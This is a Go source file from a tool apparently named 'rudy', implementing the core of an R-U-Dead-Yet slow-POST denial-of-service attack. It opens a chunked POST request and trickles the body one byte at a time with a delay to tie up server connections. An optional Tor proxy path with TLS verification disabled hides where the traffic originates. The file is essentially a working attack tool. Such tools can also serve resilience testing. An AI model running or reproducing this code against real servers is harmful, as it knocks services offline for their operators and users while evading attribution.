package request

import (
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"time"

	"github.com/darkweak/rudy/logger"
)

const (
	defaultCookieMaxAge        = 300
	defaultCookieBoundaryValue = 10000
)

var Context = context.Background()

type Request struct {
	client      *http.Client
	delay       time.Duration
	payloadSize int64
	req         *http.Request
}

func NewRequest(size int64, path string, delay time.Duration) *Request {
	cookie := &http.Cookie{ //nolint:exhaustivestruct,exhaustruct
		Name:   "rand",
		Value:  fmt.Sprint(rand.Intn(defaultCookieBoundaryValue) + 1), //nolint:gosec
		MaxAge: defaultCookieMaxAge,
	}
	req, _ := http.NewRequestWithContext(Context, http.MethodPost, path, nil)
	req.ProtoMajor = 1
	req.ProtoMinor = 1
	req.TransferEncoding = []string{"chunked"}
	req.Header = make(map[string][]string)

	req.AddCookie(cookie)

	client := http.DefaultClient
	client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}

	return &Request{
		client:      client,
		delay:       delay,
		payloadSize: size,
		req:         req,
	}
}

func (r *Request) WithTor(endpoint string) *Request {
	torProxy, err := url.Parse(endpoint)
	if err != nil {
		panic("Failed to parse proxy URL:" + err.Error())
	}

	var transport http.Transport
	transport.TLSClientConfig = &tls.Config{ //nolint:exhaustivestruct,exhaustruct
		InsecureSkipVerify: true, //nolint:gosec
	}
	transport.Proxy = http.ProxyURL(torProxy)
	r.client.Transport = &transport

	return r
}

func (r *Request) Send() error {
	pipeReader, pipeWriter := io.Pipe()
	r.req.Body = pipeReader
	closerChan := make(chan int)

	defer close(closerChan)

	go func() {
		buf := make([]byte, 1)
		newBuffer := bytes.NewBuffer(make([]byte, r.payloadSize))

		defer pipeWriter.Close()

		for {
			select {
			case <-closerChan:
				return
			default:
				if n, _ := newBuffer.Read(buf); n == 0 {
					break
				}

				_, _ = pipeWriter.Write(buf)

				logger.Logger.Sugar().Infof("Sent 1 byte of %d to %s", r.payloadSize, r.req.URL)
				time.Sleep(r.delay)
			}
		}
	}()

	res, err := r.client.Do(r.req)
	if err != nil {
		err = fmt.Errorf("an error occurred during the request: %w", err)
		logger.Logger.Sugar().Error(err)
		closerChan <- 1
	} else {
		res.Body.Close()
	}

	return err
}
